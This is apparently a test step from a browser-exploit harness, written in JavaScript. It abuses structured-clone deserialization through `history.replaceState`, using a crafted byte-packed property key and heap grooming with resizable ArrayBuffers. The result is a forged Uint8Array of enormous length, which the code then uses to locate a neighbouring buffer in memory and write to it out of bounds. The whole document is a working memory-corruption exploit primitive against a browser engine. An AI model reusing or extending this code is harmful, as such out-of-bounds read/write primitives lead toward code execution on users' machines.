// Locate a live cloned fixed buffer, write one byte through the forged view, and restore it.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  var original = new Uint8Array(fixed);
  original.fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var i = 3; i < 27; i++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + i);
    filler[i] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  mark("fixed_write_ready");
  phase = "store";
  history.replaceState(input, "");
  mark("fixed_write_stored");
  phase = "load";
  var output = history.state;
  mark("fixed_write_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 65536;
  var regionLength = 262144;
  var first = -1;
  var last = -1;
  var changes = 0;
  var normalBefore = cloned[0];
  var forgedBefore = null;
  var normalAfter = null;
  var forgedAfter = null;
  var normalRestored = null;
  var forgedRestored = null;
  if (valid) {
    phase = "baseline";
    var baseline = new Uint8Array(regionLength);
    for (var k = 0; k < regionLength; k++) baseline[k] = synthetic[k];
    mark("fixed_write_baseline_done");
    phase = "locate";
    cloned.fill(0xc4);
    for (var a = 0; a < regionLength; a++) {
      if (synthetic[a] !== baseline[a]) {
        changes++;
        if (first < 0) first = a;
        last = a;
      }
    }
    cloned.fill(0x91);
    mark("fixed_write_located");
    if (changes === 65536 && last - first === 65535 && first >= 0 &&
        synthetic[first] === 0x91) {
      phase = "write";
      forgedBefore = synthetic[first];
      synthetic[first] = 0xdb;
      mark("fixed_write_changed");
      normalAfter = cloned[0];
      forgedAfter = synthetic[first];
      phase = "restore";
      synthetic[first] = 0x91;
      normalRestored = cloned[0];
      forgedRestored = synthetic[first];
      mark("fixed_write_restored");
    }
  }
  var expected = valid && changes === 65536 && last - first === 65535 &&
    normalBefore === 0x91 && forgedBefore === 0x91 &&
    normalAfter === 0xdb && forgedAfter === 0xdb &&
    normalRestored === 0x91 && forgedRestored === 0x91 &&
    original[0] === 0x91 && new Uint8Array(target)[0] === 0x41;
  result = { id: "fixed_crosswrite", status: expected ? "pass" : "fail", details: {
    view_valid: valid, first_index: first, last_index: last,
    changed_bytes: changes, normal_before: normalBefore,
    forged_before: forgedBefore, normal_after: normalAfter,
    forged_after: forgedAfter, normal_restored: normalRestored,
    forged_restored: forgedRestored,
    original_first: original[0], target_first: new Uint8Array(target)[0]
  } };
} catch (error) {
  result = { id: "fixed_crosswrite", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
